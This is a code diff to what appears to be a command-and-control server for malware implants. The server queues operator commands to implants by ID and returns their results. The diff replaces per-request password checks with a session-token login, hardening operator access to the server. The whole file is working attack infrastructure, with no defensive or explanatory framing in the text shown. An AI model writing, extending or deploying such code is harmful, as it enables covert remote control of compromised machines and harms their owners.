@@ -4,6 +4,7 @@ import ssl
 import threading
 from queue import Queue, Empty
 from threading import Thread
+import secrets
 
 from flask import Flask, request
 
@@ -12,6 +13,8 @@ import pw_hash
 
 app = Flask(__name__)
 implant_checkout = {}
+
+operator_session_tokens = set()
 
 # Command queues for each implant identified by a 4-digit ID
 implant_command_queues = {
@@ -35,7 +38,7 @@ result_storage = {
 # Logger configuration
 logger = logging.getLogger(__name__)
 logging.basicConfig(
-    filename='pubsub.log',
+    filename='server.log',
     level=logging.DEBUG,
     format='%(asctime)s.%(msecs)03d %(levelname)s %(module)s - %(funcName)s: %(message)s',
     datefmt='%Y-%m-%d %H:%M:%S',
@@ -149,34 +152,42 @@ def handle_client(client_socket):
         request_type, *remainder = client_request.split(" ", 1)
 
         match request_type:
+            case "AUTH":
+                logger.info("authenticating user")
+                request_type, uname, passwd = client_request.split(" ", 2)
+                logger.info(f"checking authentication details for {uname}")
+                if pw_hash.compare_hash(uname, passwd):
+                    logger.info("user authenticated, generating session token")
+                    returned_token = secrets.token_hex()
+                    client_socket.send(returned_token.encode())
+                    operator_session_tokens.add(returned_token)
+                else:
+                    client_socket.send("Bad username or password\n".encode())
+
             case "PUB":
                 logger.info("request to send command, attempting")
-                request_type, implant_id, uname, passw, *command = client_request.split(" ", 4)
-                logger.info(f"checking authentication details for {uname}")
-                try:
-                    if pw_hash.compare_hash(uname, passw):
-                        command = command[0] if command else ""
-                        add_command(implant_id, uname, command)
-                        client_socket.send("Message published\n".encode())
-                        logger.info(f"Message: {command} sent to implant_id: {implant_id}")
-                except Exception as e:
-                    logger.error(f"Error occurred checking password {e}")
-                    add_user(uname)
+                request_type, implant_id, uname, token, *command = client_request.split(" ", 4)
+                logger.info(f"checking session token")
+                if token in operator_session_tokens:
+                    command = command[0] if command else ""
+                    add_command(implant_id, uname, command)
+                    client_socket.send("Message published\n".encode())
+                    logger.info(f"Message: {command} sent to implant_id: {implant_id}")
+                else:
+                    logger.error("bad token")
+                    client_socket.send("Bad token\n".encode())
 
             case "SUB":
                 logger.info("controller requesting implant last messages")
-                request_type, uname, passw, *message = client_request.split(" ", 3)
-                logger.info(f"checking authentication details for {uname}")
-                try:
-                    if pw_hash.compare_hash(uname, passw):
-                        results = get_results(uname)
-                        client_socket.send(results.encode())
-                        logger.info(f"sent controller results {results}")
-                    else:
-                        client_socket.send(f"Bad user/password".encode())
-                        logger.error(f"Bad user/password")
-                except Exception as e:
-                    logger.error(f"Error occurred checking password for {e}")
+                request_type, uname, token, *message = client_request.split(" ", 3)
+                logger.info(f"checking session token")
+                if token in operator_session_tokens:
+                    results = get_results(uname)
+                    client_socket.send(results.encode())
+                    logger.info(f"sent controller results {results}")
+                else:
+                    client_socket.send(f"Bad token\n".encode())
+                    logger.error("bad token")
 
             case _:
                 logger.error(f"unknown command: {request_type}")
